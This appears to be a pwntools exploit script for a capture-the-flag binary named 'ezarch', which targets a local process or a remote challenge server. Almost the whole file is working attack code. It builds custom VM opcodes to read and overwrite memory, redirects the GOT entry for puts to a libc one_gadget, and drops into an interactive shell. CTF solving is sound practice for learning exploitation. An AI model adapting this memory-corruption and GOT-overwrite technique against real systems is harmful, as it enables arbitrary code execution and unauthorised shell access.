#-*- coding:utf-8 -*-
from pwn import *
debug=1
context.log_level = 'debug'
if debug:
    io = process('./ezarch')
else:
    io = remote("112.126.101.96",9999)
elf = ELF('./ezarch')
#libc=libc('./libc.so')
#gadgets=[324293,324386,1090444]
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadgets=[283158, 283242, 983716, 987463]

s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)


def memory(size,init,content,eip,esp,ebp):
    ru('>')
    sl('M')
    ru('[*]Memory size>')
    sl(size)
    ru('[*]Inited size>')
    sl(init)
    ru('[*]Input Memory Now ')
    sl(content)
    ru('eip>') #eip<memory size
    sl(eip)
    ru('esp>') #esp<stack size 0x1000
    sl(eip)
    ru('ebp>') #ebp<memory size
    sl(ebp)

op=lambda opcode,type1,type2,oprand1,oprand2 : bytes.decode(flat(p8(opcode),p8(type1+type2*0x10),p32(oprand1),p32(oprand2)),"unicode-escape")
#mov mem->stack 2 got
c=''
c+=op(3,2,2,1,17)  #mov mem->stack+ebp to memory+r1
c+=op(2,2,1,1,0xc0-0x18)  #sub memory+r1 0xc0-0x18
c+=op(3,2,2,17,1) #mov memory+r1 to mem->stack+ebp 

#change got['puts'] onegadget
c+=op(3,0,1,17,8) #ebp=8
c+=op(3,2,2,1,17) #mov mem->stack+ebp to memory+r1
c+=op(2,2,1,1,libc.symbols['puts']-gadgets[0])  #sub memory+r1 libc.symbols['puts']-gadgets[0]
c+=op(3,2,2,17,1) #mov memory+r1 to mem->stack+ebp 
memory(0x2000,len(c),c,0,0x900,0x1008)

#getshell
ru('>')
sl('R')
io.interactive()